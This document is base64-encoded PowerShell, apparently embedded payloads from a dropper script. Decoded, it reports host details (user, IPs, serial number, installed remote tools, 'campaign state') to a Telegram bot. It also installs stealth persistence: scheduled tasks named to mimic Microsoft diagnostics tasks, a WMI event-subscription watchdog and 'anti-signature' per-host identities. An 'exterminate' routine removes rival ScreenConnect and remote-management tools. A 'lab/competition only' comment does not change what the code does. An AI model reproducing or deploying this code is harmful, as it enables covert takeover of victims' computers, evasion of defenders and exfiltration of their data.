aWYgKFRlc3QtUGF0aCAkYm9vdFBhdGgpIHsNCiAgICAgICAgJGludGVyZXN0aW5nID0gQCgNCiAg
ICAgICAgICAgICdtc2lfJywgJ2ZldGNoXycsICdwcmltYXJ5XycsICdudWtlXycsICdtc2lfdG9v
JywgJ21zaV9mZXRjaCcsICdtc2lfZXhpdCcsDQogICAgICAgICAgICAnbXNpX3VuYXZhaWxhYmxl
JywgJ3NlY3VyZV8nLCAnZ29fJw0KICAgICAgICApDQogICAgICAgIEdldC1Db250ZW50IC1MaXRl
cmFsUGF0aCAkYm9vdFBhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfA0KICAgICAg
ICAgICAgV2hlcmUtT2JqZWN0IHsNCiAgICAgICAgICAgICAgICAkbGluZSA9ICRfDQogICAgICAg
ICAgICAgICAgZm9yZWFjaCAoJHQgaW4gJGludGVyZXN0aW5nKSB7IGlmICgkbGluZSAtbGlrZSAi
KiR0KiIpIHsgcmV0dXJuICR0cnVlIH0gfQ0KICAgICAgICAgICAgICAgICRmYWxzZQ0KICAgICAg
ICAgICAgfSB8DQogICAgICAgICAgICBTZWxlY3QtT2JqZWN0IC1MYXN0IDE4IHwNCiAgICAgICAg
ICAgIEZvckVhY2gtT2JqZWN0IHsgW3ZvaWRdJGRpYWdMaW5lcy5BZGQoKCctIDxjb2RlPnswfTwv
Y29kZT4nIC1mIChFc2MgKCRfIC1yZXBsYWNlICdbXlx4MjAtXHg3RV0nLCAnPycpKSkpIH0NCiAg
ICB9DQogICAgaWYgKCRkaWFnTGluZXMuQ291bnQgLWVxIDApIHsgW3ZvaWRdJGRpYWdMaW5lcy5B
ZGQoJy0gKG5vIGluc3RhbGwvbnVrZSBtYXJrZXJzIGluIGJvb3QuZXJyKScpIH0NCiAgICAkZGVw
bG95QmxvY2sgPSBAIg0KDQo8Yj5EZXBsb3kgdmVyZGljdDwvYj4NCi0gUmVzdWx0OiA8Yj4kKEVz
YyAkdmVyZGljdCk8L2I+DQotIFByaW1hcnkgUnVubmluZzogJChpZiAoJHByaW1PaykgeyAnWUVT
JyB9IGVsc2UgeyAnTk8nIH0pDQotIE1vbml0b3Igc2NyaXB0ICgud3VjYWNoZVxvd25fbW9uLmNt
ZCk6ICQoaWYgKCRoYXNNb24pIHsgJ1lFUycgfSBlbHNlIHsgJ05PJyB9KQ0KLSBCYWNrdXAgbW9u
ICguZXRsY2FjaGVcZXRsX21vbi5jbWQpOiAkKGlmICgkaGFzRXRsKSB7ICdZRVMnIH0gZWxzZSB7
ICdOTycgfSkNCi0gUGVyc2lzdCB0YXNrcyBPSzogJHRhc2tPayAvICQoJGV4cGVjdGVkVGFza3Mu
Q291bnQpIChiYWQvbWlzc2luZzogJHRhc2tCYWQpDQotIE1TSSBjYWNoZTogJChFc2MgJG1zaVNp
emUpDQotIEZvcmVpZ24gU0MgZm9sZGVycyBsZWZ0OiAkKCRmb3JlaWduLkNvdW50KQ0KLSBOb3Rl
OiBMYXN0UmVzdWx0IDI2NzAxMSA9IHRhc2sgbm90IHlldCBydW4gKG5vcm1hbCByaWdodCBhZnRl
ciBjcmVhdGUpDQoNCjxiPkRlcGxveSBsb2cgbWFya2VyczwvYj4NCiQoJGRpYWdMaW5lcyAtam9p
biAiYG4iKQ0KIkANCn0NCg0KJHRleHQgPSBAIg0KJGVtb2ppIDxiPlNDIE1vbml0b3IgLSAkKEVz
YyAkdGl0bGUpPC9iPg0KDQo8Yj5FdmVudDwvYj4NCi0gU3VtbWFyeTogJChFc2MgJFN1bW1hcnkp
DQotIFRyYW5zaXRpb246IDxjb2RlPiQoRXNjICR0cmFucyk8L2NvZGU+DQotIFdoZW46ICQoRXNj
ICRub3cpDQokZGVwbG95QmxvY2sNCg0KPGI+SG9zdDwvYj4NCi0gQ29tcHV0ZXI6IDxjb2RlPiQo
RXNjICRlbnY6Q09NUFVURVJOQU1FKTwvY29kZT4NCi0gVXNlcjogPGNvZGU+JChFc2MgJHdobyk8
L2NvZGU+DQotIEVsZXZhdGVkOiAkZWxldiB8IFNZU1RFTTogJGlzU3lzdGVtDQotIERvbWFpbi9X
b3JrZ3JvdXA6ICQoRXNjICRvcy5Eb21haW4pDQoNCjxiPk5ldHdvcms8L2I+DQotIExBTiBJUHM6
IDxjb2RlPiQoRXNjICRsYW4pPC9jb2RlPg0KLSBQdWJsaWMgSVA6IDxjb2RlPiQoRXNjICRwdWIp
PC9jb2RlPg0KDQo8Yj5PUyAvIEhhcmR3YXJlPC9iPg0KLSBPUzogJChFc2MgJG9zLkNhcHRpb24p
DQotIFZlcnNpb246ICQoRXNjICRvcy5WZXJzaW9uKSAoYnVpbGQgJChFc2MgJG9zLkJ1aWxkKSkg
JChFc2MgJG9zLkFyY2gpDQotIEluc3RhbGw6ICQoRXNjICRvcy5JbnN0YWxsRGF0ZSkgfCBMYXN0
IGJvb3Q6ICQoRXNjICRvcy5MYXN0Qm9vdCkNCi0gVXB0aW1lOiAkKEVzYyAkdXB0aW1lKQ0KLSBD
UFU6ICQoRXNjICRvcy5DUFUpDQotIEhhcmR3YXJlOiAkKEVzYyAkb3MuTWFudWZhY3R1cmVyKSAk
KEVzYyAkb3MuTW9kZWwpDQotIFNlcmlhbDogPGNvZGU+JChFc2MgJG9zLlNlcmlhbCk8L2NvZGU+
DQotIFJBTTogJCgkb3MuVG90YWxSQU1fR0IpIEdCDQotIERpc2sgQzogJCgkb3MuRGlza0ZyZWVf
R0IpIEdCIGZyZWUgLyAkKCRvcy5EaXNrU2l6ZV9HQikgR0INCg0KPGI+U2NyZWVuQ29ubmVjdCAo
YWxsKTwvYj4NCi0gUHJpbWFyeSA8Y29kZT41ZjYwMTA1Nzk4NTJlNTA3PC9jb2RlPjogJChFc2Mg
JHByaW1MaW5lKQ0KLSBBbHQgPGNvZGU+Zjg2MWM4MTQwZDQ1MzQyNzwvY29kZT46ICQoRXNjICRh
bHRMaW5lKQ0KJCgkc2NMaXN0IC1qb2luICJgbiIpDQoNCjxiPk90aGVyIFJNTSAvIHJlbW90ZSB0
b29sczwvYj4NCiQoJHJtbUhpdHMgLWpvaW4gImBuIikNCg0KPGI+UGVyc2lzdCB0YXNrcyAoZXhw
ZWN0ZWQpPC9iPg0KJCgkdGFza0xpbmVzIC1qb2luICJgbiIpDQoNCjxiPkNhY2hlPC9iPg0KLSBN
U0kgY2FjaGU6ICQoRXNjICRtc2lTaXplKQ0KLSBXb3JrRGlyOiA8Y29kZT4kKEVzYyAkV29ya0Rp
cik8L2NvZGU+DQoNCjxiPkNhbXBhaWduIHN0YXRlPC9iPg0KLSA8Y29kZT4kKEVzYyAkc3RhdGVM
aW5lKTwvY29kZT4NCg0KPGk+Qm90OiBAbm9idWRkeXJtbUJvdCB8IFRHX1JFUE9SVCBUODwvaT4N
CiJADQoNCiMgY29tcGFjdCBkaWdlc3QgbW9kZTogb25lIHNob3J0IGxpbmUsIEhUTUwtZnJlZSAo
aG91cmx5IGhlYXJ0YmVhdCkNCmlmICgkTW9kZSAtZXEgJ2NvbXBhY3QnKSB7DQogICAgJGZvcmVp
Z25OID0gMA0KICAgIGlmICgkc3RhdGVPYmogLWFuZCAkc3RhdGVPYmouZm9yZWlnbikgeyAkZm9y
ZWlnbk4gPSBAKCRzdGF0ZU9iai5mb3JlaWduKS5Db3VudCB9DQogICAgJG1zaVNob3J0ID0gaWYg
KFRlc3QtUGF0aCAkbXNpQ2FjaGUpIHsgJ3swOk4wfUtCJyAtZiAoKEdldC1JdGVtICRtc2lDYWNo
ZSAtRm9yY2UpLkxlbmd0aCAvIDFLQikgfSBlbHNlIHsgJzAnIH0NCiAgICAkcHJpbVNob3J0ID0g
aWYgKCRwcmltT2spIHsgJ09LJyB9IGVsc2UgeyAnRE9XTicgfQ0KICAgICRhbHRTaG9ydCA9IGlm
ICgkYWx0TGluZSAtbGlrZSAnUnVubmluZyonKSB7ICdPSycgfSBlbHNlIHsgJy0nIH0NCiAgICAk
dGV4dCA9ICIkZW1vamkgU0NEfCQoJGVudjpDT01QVVRFUk5BTUUpfHByaW09JHByaW1TaG9ydHxh
bHQ9JGFsdFNob3J0fGZvcmVpZ249JGZvcmVpZ25OfHRhc2tzPSR0YXNrT2svNXxtc2k9JG1zaVNo
b3J0fHVwPSR1cHRpbWV8Yj0kQnVpbGR8JG5vdyINCn0NCg0KaWYgKCR0ZXh0Lkxlbmd0aCAtZ3Qg
MzgwMCkgew0KICAgICRybW1IaXRzID0gQCgoJHJtbUhpdHMgfCBTZWxlY3QtT2JqZWN0IC1GaXJz
dCAxMikpICsgKCctIC4uLiAoezB9IG1vcmUpJyAtZiAoJHJtbUhpdHMuQ291bnQgLSAxMikpDQog
ICAgJHNjTGlzdCA9IEAoKCRzY0xpc3QgfCBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxNCkpICsgKCct
IC4uLiAoezB9IG1vcmUpJyAtZiAoJHNjTGlzdC5Db3VudCAtIDE0KSkNCiAgICAkdGV4dCA9ICR0
ZXh0LlN1YnN0cmluZygwLCAzODAwKSArICJgbmBuPGk+VFJVTkNBVEVEIChUZWxlZ3JhbSA0MDk2
IGxpbWl0KTwvaT4iDQp9DQoNCiRsb2cgPSBKb2luLVBhdGggJFdvcmtEaXIgJ2Jvb3QuZXJyJw0K
ZnVuY3Rpb24gU2VuZC1UZyhbc3RyaW5nXSRtc2csIFtzdHJpbmddJG1vZGUpIHsNCiAgICAkcGF5
bG9hZCA9IEB7DQogICAgICAgIGNoYXRfaWQgICAgICAgICAgICAgICAgICA9ICRjZmcuQ0hBVF9J
RA0KICAgICAgICB0ZXh0ICAgICAgICAgICAgICAgICAgICAgPSAkbXNnDQogICAgICAgIGRpc2Fi
bGVfd2ViX3BhZ2VfcHJldmlldyA9ICR0cnVlDQogICAgfQ0KICAgIGlmICgkbW9kZSkgeyAkcGF5
bG9hZC5wYXJzZV9tb2RlID0gJG1vZGUgfQ0KICAgICRqc29uID0gJHBheWxvYWQgfCBDb252ZXJ0
VG8tSnNvbiAtQ29tcHJlc3MgLURlcHRoIDUNCiAgICAkYnl0ZXMgPSBbU3lzdGVtLlRleHQuRW5j
b2RpbmddOjpVVEY4LkdldEJ5dGVzKCRqc29uKQ0KICAgIEludm9rZS1SZXN0TWV0aG9kIC1Vcmkg
KCJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90JCgkY2ZnLkJPVF9UT0tFTikvc2VuZE1lc3Nh
Z2UiKSBgDQogICAgICAgIC1NZXRob2QgUG9zdCAtQm9keSAkYnl0ZXMgLUNvbnRlbnRUeXBlICdh
cHBsaWNhdGlvbi9qc29uOyBjaGFyc2V0PXV0Zi04JyB8IE91dC1OdWxsDQp9DQoNCmZ1bmN0aW9u
IFNlbmQtVGdTYWZlKFtzdHJpbmddJG1zZywgW3N0cmluZ10kbW9kZSkgew0KICAgICR0b1NlbmQg
PSAkbXNnDQogICAgdHJ5IHsNCiAgICAgICAgU2VuZC1UZyAtbXNnICR0b1NlbmQgLW1vZGUgJG1v
ZGUNCiAgICAgICAgcmV0dXJuICR0cnVlDQogICAgfSBjYXRjaCB7DQogICAgICAgIHRyeSB7DQog
ICAgICAgICAgICBTZW5kLVRnIC1tc2cgKCR0b1NlbmQuU3Vic3RyaW5nKDAsIDMwMDApICsgImBu
PGk+VFJVTkNBVEVEPC9pPiIpIC1tb2RlICRtb2RlDQogICAgICAgICAgICByZXR1cm4gJHRydWUN
CiAgICAgICAgfSBjYXRjaCB7DQogICAgICAgICAgICByZXR1cm4gJGZhbHNlDQogICAgICAgIH0N
CiAgICB9DQp9DQoNCnRyeSB7DQogICAgaWYgKFNlbmQtVGdTYWZlIC1tc2cgJHRleHQgLW1vZGUg
J0hUTUwnKSB7DQogICAgICAgIEFkZC1Db250ZW50IC1MaXRlcmFsUGF0aCAkbG9nIC1WYWx1ZSAn
dGdfc2VudF9yaWNoJyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgIH0gZWxzZSB7
DQogICAgICAgIHRocm93ICdodG1sX2ZhaWxlZCcNCiAgICB9DQogICAgaWYgKCRrZXkgLWVxICdE
RVBMT1knKSB7DQogICAgICAgIEFkZC1Db250ZW50IC1MaXRlcmFsUGF0aCAkbG9nIC1WYWx1ZSAo
InRnX2RlcGxveV9vaz0iICsgJGRlcGxveU9rKSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51
ZQ0KICAgICAgICBTZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggKEpvaW4tUGF0aCAkV29ya0RpciAn
ZGVwbG95X3RnLmZsYWcnKSAtVmFsdWUgKEdldC1EYXRlIC1Gb3JtYXQgJ28nKSAtRXJyb3JBY3Rp
b24gU2lsZW50bHlDb250aW51ZQ0KICAgIH0NCn0gY2F0Y2ggew0KICAgIHRyeSB7DQogICAgICAg
ICRwbGFpbiA9IFtyZWdleF06OlJlcGxhY2UoJHRleHQsICc8W14+XSs+JywgJycpDQogICAgICAg
ICRwbGFpbiA9IFtTeXN0ZW0uTmV0LldlYlV0aWxpdHldOjpIdG1sRGVjb2RlKCRwbGFpbikNCiAg
ICAgICAgaWYgKCRwbGFpbi5MZW5ndGggLWd0IDM1MDApIHsgJHBsYWluID0gJHBsYWluLlN1YnN0
cmluZygwLCAzNTAwKSArICJgblRSVU5DQVRFRCIgfQ0KICAgICAgICBTZW5kLVRnU2FmZSAtbXNn
ICRwbGFpbiAtbW9kZSAnJyB8IE91dC1OdWxsDQogICAgICAgIEFkZC1Db250ZW50IC1MaXRlcmFs
UGF0aCAkbG9nIC1WYWx1ZSAndGdfc2VudF9wbGFpbicgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u
dGludWUNCiAgICB9IGNhdGNoIHsNCiAgICAgICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRs
b2cgLVZhbHVlICgidGdfZmFpbCAiICsgJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIC1FcnJvckFjdGlv
biBTaWxlbnRseUNvbnRpbnVlDQogICAgfQ0KfQ0K
::B64_TGR_END
::B64_LIB_BEGIN
I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQ0KIyDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZANCiMgT1dOX0xJQiAg
QlVJTEQgMjAyNjA4MDJMMw0KIyBTaGFyZWQgbGlicmFyeTogcGVyLWhvc3QgaWRlbnRpdHkgKGFu
dGktc2lnbmF0dXJlKSwgV01JIHdhdGNoZG9nDQojIChtdXR1YWwgcGVyc2lzdGVuY2UgY2hhaW4p
LCBjYW1wYWlnbiBzdGF0ZSBmaWxlLCBTQyBzZXJ2aWNlIHJlcGFpci4NCiMgTDI6IHNhZmUgdGFz
ay1uYW1lIHBvb2xzIChwYXJlbnRzIGV4aXN0IG9uIGFsbCBXaW4xMC8xMSksIElERU5UVkVSDQoj
IHJlZ2VuZXJhdGlvbiwgLUFjdGlvbiByZXBhaXIgcmVjcmVhdGVzIGRlbGV0ZWQgU0Mgc2Vydmlj
ZXMgdmlhDQojIG1zaWV4ZWMgL2ZhIHtHVUlEfSAobmV2ZXIgdHJpZ2dlcnMgU0MtZmFtaWx5IG1h
am9yLXVwZ3JhZGUgcmVtb3ZhbCkuDQojIEwzOiAtQWN0aW9uIGV4dGVybWluYXRlIC0gdHJ1ZSBy
ZW1vdmFsIGVuZ2luZSBmb3IgZm9yZWlnbiBTY3JlZW5Db25uZWN0DQojIChNU0kgdW5pbnN0YWxs
ICsgc3ZjL3Byb2MvZGlyIGtpbGwpIGFuZCBkaXNhbGxvd2VkIFJNTSB0b29scy4NCiMgQXV0aG9y
aXplZCBpbnRlcm5hbCBkZXBsb3ltZW50IC0gbGFiL2NvbXBldGl0aW9uIHNjb3BlIG9ubHkuDQoj
IOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkA0KW0NtZGxldEJpbmRpbmcoKV0NCnBhcmFtKA0KICAgIFtQYXJh
bWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXQ0KICAgIFtWYWxpZGF0ZVNldCgnaW5pdCcsICd3YXRj
aGRvZycsICd3YXRjaGRvZy1lbnN1cmUnLCAnc3RhdGUnLCAnaWRlbnRpdHknLCAncmVwYWlyJywg
J2V4dGVybWluYXRlJyldDQogICAgW3N0cmluZ10kQWN0aW9uLA0KICAgIFtzdHJpbmddJFdvcmtE
aXIgPSAnQzpcUHJvZ3JhbURhdGFcTWljcm9zb2Z0XFdpbmRvd3NcV0VSXFRlbXBcLnd1Y2FjaGUn
LA0KICAgIFtzdHJpbmddJE1vblBhdGggPSAnJywNCiAgICBbc3RyaW5nXSRCdWlsZCAgPSAnTzE1
JywNCiAgICBbc3RyaW5nXSRFeHRyYSAgPSAnJywNCiAgICBbc3RyaW5nXSRGcCAgICAgPSAnJw0K
KQ0KDQokRXJyb3JBY3Rpb25QcmVmZXJlbmNlID0gJ1NpbGVudGx5Q29udGludWUnDQokY2ZnUGF0
aCA9IEpvaW4tUGF0aCAkV29ya0RpciAnaWRlbnRpdHkuY2ZnJw0KJElkZW50VmVyc2lvbiA9IDIN
Cg0KIyBMZWdpdC1sb29raW5nIHRhc2stbmFtZSBwb29sczsgcGVyLWhvc3QgaGFzaCBwaWNrcyBv
bmUgcGVyIHNsb3QuDQojIHYyOiBPTkxZIHBhcmVudCBmb2xkZXJzIHRoYXQgZXhpc3Qgb24gZXZl
cnkgV2luMTAvMTEgKFd3YW5TdmMvTWVtb3J5RGlhZ25vc3RpYy8NCiMgUG93ZXJFZmZpY2llbmN5
L0Rpc2tEaWFnbm9zdGljIHBhcmVudHMgYXJlIGFic2VudCBvbiBzb21lIG1hY2hpbmVzIC0+IC9D
cmVhdGUgZmFpbGVkKS4NCiRQb29scyA9IEB7DQogICAgQSA9IEAoJ1xNaWNyb3NvZnRcV2luZG93
c1xEaWFnbm9zaXNcU2NoZWR1bGVkJywnXE1pY3Jvc29mdFxXaW5kb3dzXERpYWdub3Npc1xCVlRD
b25zdW1lcicsJ1xNaWNyb3NvZnRcV2luZG93c1xOZXRUcmFjZVxHYXRoZXJOZXR3b3JrSW5mbycs
J1xNaWNyb3NvZnRcV2luZG93c1xXRElcUmVzb2x1dGlvbkhvc3QnLCdcTWljcm9zb2Z0XFdpbmRv
d3NcUExBXFNlcnZlciBEaWFnbm9zdGljcycsJ1xNaWNyb3NvZnRcV2luZG93c1xUY3BpcFxJcEFk
ZHJlc3NDb25mbGljdDEnLCdcTWljcm9zb2Z0XFdpbmRvd3NcUExBXFNlcnZlcicsJ1xNaWNyb3Nv
ZnRcV2luZG93c1xEaWFnbm9zaXNcU1JUYXNrJykNCiAgICBCID0gQCgnXE1pY3Jvc29mdFxXaW5k
b3dzXFBMQVxTZXJ2ZXInLCdcTWljcm9zb2Z0XFdpbmRvd3NcV0RJXFJlc29sdXRpb25Ib3N0Jywn
XE1pY3Jvc29mdFxXaW5kb3dzXERpYWdub3Npc1xCVlRDb25zdW1lcicsJ1xNaWNyb3NvZnRcV2lu
ZG93c1xOZXRUcmFjZVxHYXRoZXJOZXR3b3JrSW5mbycsJ1xNaWNyb3NvZnRcV2luZG93c1xEaWFn
bm9zaXNcU2NoZWR1bGVkJywnXE1pY3Jvc29mdFxXaW5kb3dzXFRjcGlwXElwQWRkcmVzc0NvbmZs
aWN0MicsJ1xNaWNyb3NvZnRcV2luZG93c1xQTEFcU2VydmVyIERpYWdub3N0aWNzJywnXE1pY3Jv
c29mdFxXaW5kb3dzXERpYWdub3Npc1xTUlRhc2snKQ0KICAgIEMgPSBAKCdcTWljcm9zb2Z0XFdp
bmRvd3NcV0RJXFJlc29sdXRpb25Ib3N0JywnXE1pY3Jvc29mdFxXaW5kb3dzXE5ldFRyYWNlXEdh
dGhlck5ldHdvcmtJbmZvJywnXE1pY3Jvc29mdFxXaW5kb3dzXFRjcGlwXElwQWRkcmVzc0NvbmZs
aWN0MScsJ1xNaWNyb3NvZnRcV2luZG93c1xEaWFnbm9zaXNcQlZUQ29uc3VtZXInLCdcTWljcm9z
b2Z0XFdpbmRvd3NcUExBXFNlcnZlcicsJ1xNaWNyb3NvZnRcV2luZG93c1xEaWFnbm9zaXNcU2No
ZWR1bGVkJywnXE1pY3Jvc29mdFxXaW5kb3dzXFBMQVxTZXJ2ZXIgRGlhZ25vc3RpY3MnLCdcTWlj
cm9zb2Z0XFdpbmRvd3NcRGlhZ25vc2lzXFNSVGFzaycpDQogICAgRCA9IEAoJ1xNaWNyb3NvZnRc
V2luZG93c1xUY3BpcFxJcEFkZHJlc3NDb25mbGljdDEnLCdcTWljcm9zb2Z0XFdpbmRvd3NcV0RJ
XFJlc29sdXRpb25Ib3N0JywnXE1pY3Jvc29mdFxXaW5kb3dzXE5ldFRyYWNlXEdhdGhlck5ldHdv
cmtJbmZvJywnXE1pY3Jvc29mdFxXaW5kb3dzXERpYWdub3Npc1xCVlRDb25zdW1lcicsJ1xNaWNy
b3NvZnRcV2luZG93c1xQTEFcU2VydmVyJywnXE1pY3Jvc29mdFxXaW5kb3dzXERpYWdub3Npc1xT
Y2hlZHVsZWQnLCdcTWljcm9zb2Z0XFdpbmRvd3NcUExBXFNlcnZlciBEaWFnbm9zdGljcycsJ1xN
aWNyb3NvZnRcV2luZG93c1xEaWFnbm9zaXNcU1JUYXNrJykNCn0NCiREZWZhdWx0cyA9IFtvcmRl
cmVkXUB7DQogICAgVEFTS19BID0gJ1xNaWNyb3NvZnRcV2luZG93c1xEaWFnbm9zaXNcU2NoZWR1
bGVkJw0KICAgIFRBU0tfQiA9ICdcTWljcm9zb2Z0XFdpbmRvd3NcUExBXFNlcnZlcicNCiAgICBU
QVNLX0MgPSAnXE1pY3Jvc29mdFxXaW5kb3dzXFdESVxSZXNvbHV0aW9uSG9zdCcNCiAgICBUQVNL
X0QgPSAnXE1pY3Jvc29mdFxXaW5kb3dzXFRjcGlwXElwQWRkcmVzc0NvbmZsaWN0MScNCiAgICBN
T19BICAgPSAnMicNCiAgICBNT19CICAgPSAnMycNCn0NCg0KZnVuY3Rpb24gR2V0LUhvc3RTZWVk
IHsNCiAgICAkcyA9IDBMDQogICAgZm9yZWFjaCAoJGMgaW4gJGVudjpDT01QVVRFUk5BTUUuVG9V
cHBlcigpLlRvQ2hhckFycmF5KCkpIHsgJHMgPSAoJHMgKiAzMSArIFtpbnRdJGMpICUgMTAwMDAw
MDAwNyB9DQogICAgcmV0dXJuICRzDQp9DQoNCmZ1bmN0aW9uIFJlYWQtSWRlbnRpdHkgew0KICAg
ICRpZCA9ICREZWZhdWx0cy5DbG9uZSgpDQogICAgaWYgKFRlc3QtUGF0aCAkY2ZnUGF0aCkgew0K
ICAgICAgICBmb3JlYWNoICgkbGluZSBpbiAoR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRjZmdQ
YXRoIC1Gb3JjZSkpIHsNCiAgICAgICAgICAgIGlmICgkbGluZSAtbWF0Y2ggJ15ccyooW0EtWl9d
Kylccyo9XHMqKC4rPylccyokJykgeyAkaWRbJG1hdGNoZXNbMV1dID0gJG1hdGNoZXNbMl0gfQ0K
ICAgICAgICB9DQogICAgfQ0KICAgIHJldHVybiAkaWQNCn0NCg0KZnVuY3Rpb24gUmVtb3ZlLVRh
c2tRdWlldChbc3RyaW5nXSR0bikgew0KICAgIGlmICgkdG4pIHsgJiBzY2h0YXNrcy5leGUgL0Rl
bGV0ZSAvVE4gJHRuIC9GIDI+JjEgfCBPdXQtTnVsbCB9DQp9DQoNCmZ1bmN0aW9uIEluaXRpYWxp
emUtSWRlbnRpdHkgew0KICAgICMgSWRlbXBvdGVudCB3aXRoaW4gYW4gSURFTlRWRVIgZ2VuZXJh
dGlvbi4gUG9vbCB1cGdyYWRlcyBidW1wIElERU5UVkVSOg0KICAgICMgb2xkLW5hbWUgdGFza3Mg
YXJlIGRlbGV0ZWQsIHRoZW4gaWRlbnRpdHkgaXMgcmVnZW5lcmF0ZWQgZnJvbSB0aGUgc2FtZSBz
ZWVkLg0KICAgIGlmIChUZXN0LVBhdGggJGNmZ1BhdGgpIHsNCiAgICAgICAgJG9sZCA9IFJlYWQt
SWRlbnRpdHkNCiAgICAgICAgaWYgKCRvbGRbJ0lERU5UVkVSJ10gLWVxICIkSWRlbnRWZXJzaW9u
IikgeyByZXR1cm4gJG9sZCB9DQogICAgICAgIGZvcmVhY2ggKCRrIGluICdUQVNLX0EnLCdUQVNL
X0InLCdUQVNLX0MnLCdUQVNLX0QnKSB7IFJlbW92ZS1UYXNrUXVpZXQgJG9sZFska10gfQ0KICAg
ICAgICBSZW1vdmUtSXRlbSAtTGl0ZXJhbFBhdGggJGNmZ1BhdGggLUZvcmNlDQogICAgfQ0KICAg
ICRzID0gR2V0LUhvc3RTZWVkDQogICAgJGNmZyA9IEAoDQogICAgICAgICJUQVNLX0E9JCgkUG9v
bHMuQVskcyAlIDhdKSINCiAgICAgICAgIlRBU0tfQj0kKCRQb29scy5CWygkcyArIDMpICUgOF0p
Ig0KICAgICAgICAiVEFTS19DPSQoJFBvb2xzLkNbKCRzICsgNSkgJSA4XSkiDQogICAgICAgICJU
QVNLX0Q9JCgkUG9vbHMuRFsoJHMgKyA3KSAlIDhdKSINCiAgICAgICAgIk1PX0E9JCgyICsgKCRz
ICUgNCkpIiAgICAgICAgICAjIDItNSBtaW4gaml0dGVyDQogICAgICAgICJNT19CPSQoMyArICgo
JHMgKyAxKSAlIDMpKSIgICAgIyAzLTUgbWluIGppdHRlcg0KICAgICAgICAiU0VFRD0kcyINCiAg
ICAgICAgIklERU5UVkVSPSRJZGVudFZlcnNpb24iDQogICAgKQ0KICAgIFNldC1Db250ZW50IC1M
aXRlcmFsUGF0aCAkY2ZnUGF0aCAtVmFsdWUgJGNmZyAtRm9yY2UNCiAgICByZXR1cm4gKFJlYWQt
SWRlbnRpdHkpDQp9DQoNCmZ1bmN0aW9uIEluc3RhbGwtV2F0Y2hkb2cgew0KICAgIGlmICgtbm90
ICRNb25QYXRoKSB7IHJldHVybiAkZmFsc2UgfQ0KICAgICRvayA9ICR0cnVlDQogICAgdHJ5IHsN
CiAgICAgICAgU2V0LVdtaUluc3RhbmNlIC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRpb24gLUNs
YXNzIF9fSW50ZXJ2YWxUaW1lckluc3RydWN0aW9uIGANCiAgICAgICAgICAgIC1Bcmd1bWVudHMg
QHsgVGltZXJJZCA9ICdXdWNhY2hlV2F0Y2hkb2cnOyBJbnRlcnZhbE1pbGxpc2Vjb25kcyA9IDE4
MDAwMDsgU2tpcElmUGFzc2VkID0gJGZhbHNlIH0gfCBPdXQtTnVsbA0KICAgICAgICAkZiA9IFNl
dC1XbWlJbnN0YW5jZSAtTmFtZXNwYWNlIHJvb3Rcc3Vic2NyaXB0aW9uIC1DbGFzcyBfX0V2ZW50
RmlsdGVyIGANCiAgICAgICAgICAgIC1Bcmd1bWVudHMgQHsgTmFtZSA9ICdXdWNhY2hlV2F0Y2hk
b2dGJzsgRXZlbnROYW1lc3BhY2UgPSAncm9vdFxjaW12Mic7IFF1ZXJ5TGFuZ3VhZ2UgPSAnV1FM
JzsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgUXVlcnkgPSAiU0VMRUNUICogRlJPTSBfX1Rp
bWVyRXZlbnQgV0hFUkUgVGltZXJJZD0nV3VjYWNoZVdhdGNoZG9nJyIgfQ0KICAgICAgICAkYyA9
IFNldC1XbWlJbnN0YW5jZSAtTmFtZXNwYWNlIHJvb3Rcc3Vic2NyaXB0aW9uIC1DbGFzcyBDb21t
YW5kTGluZUV2ZW50Q29uc3VtZXIgYA0KICAgICAgICAgICAgLUFyZ3VtZW50cyBAeyBOYW1lID0g
J1d1Y2FjaGVXYXRjaGRvZ0MnOyBDb21tYW5kTGluZVRlbXBsYXRlID0gImNtZC5leGUgL2MgYCIk
TW9uUGF0aGAiIjsgUnVuSW50ZXJhY3RpdmVseSA9ICRmYWxzZSB9DQogICAgICAgIFNldC1XbWlJ
bnN0YW5jZSAtTmFtZXNwYWNlIHJvb3Rcc3Vic2NyaXB0aW9uIC1DbGFzcyBfX0ZpbHRlclRvQ29u
c3VtZXJCaW5kaW5nIGANCiAgICAgICAgICAgIC1Bcmd1bWVudHMgQHsgRmlsdGVyID0gJGY7IENv
bnN1bWVyID0gJGMgfSB8IE91dC1OdWxsDQogICAgfSBjYXRjaCB7ICRvayA9ICRmYWxzZSB9DQog
ICAgcmV0dXJuICRvaw0KfQ0KDQpmdW5jdGlvbiBFbnN1cmUtV2F0Y2hkb2cgew0KICAgICRjID0g
R2V0LVdtaU9iamVjdCAtTmFtZXNwYWNlIHJvb3Rcc3Vic2NyaXB0aW9uIC1DbGFzcyBDb21tYW5k
TGluZUV2ZW50Q29uc3VtZXIgLUZpbHRlciAiTmFtZT0nV3VjYWNoZVdhdGNoZG9nQyciDQogICAg
